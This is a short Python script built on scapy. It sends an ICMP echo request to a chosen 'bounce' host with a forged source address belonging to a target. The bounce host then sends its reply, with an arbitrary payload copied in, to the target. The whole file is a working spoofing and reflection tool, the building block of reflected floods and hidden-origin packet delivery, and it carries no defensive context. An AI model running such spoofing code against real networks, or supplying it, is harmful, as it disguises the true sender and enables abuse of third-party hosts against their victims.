#!/usr/bin/env python3

import sys
from scapy.all import *


if __name__ == '__main__':
    try:
        bounce_ip = sys.argv[1]
        target_ip = sys.argv[2]
        payload = sys.argv[3]

        # Makes an ICMP Request to bounce_ip, with a forged source IP of target_ip, which
        # will cause bounce_ip to send an ICMP reply to target_ip, copying the payload.
        send(IP(src=target_ip, dst=bounce_ip)/ICMP()/Raw(payload.encode('UTF-8')))

    except IndexError:
        print("Usage: {} <bounce ip> <target ip> <payload>".format(sys.argv[0]))
        sys.exit(1)


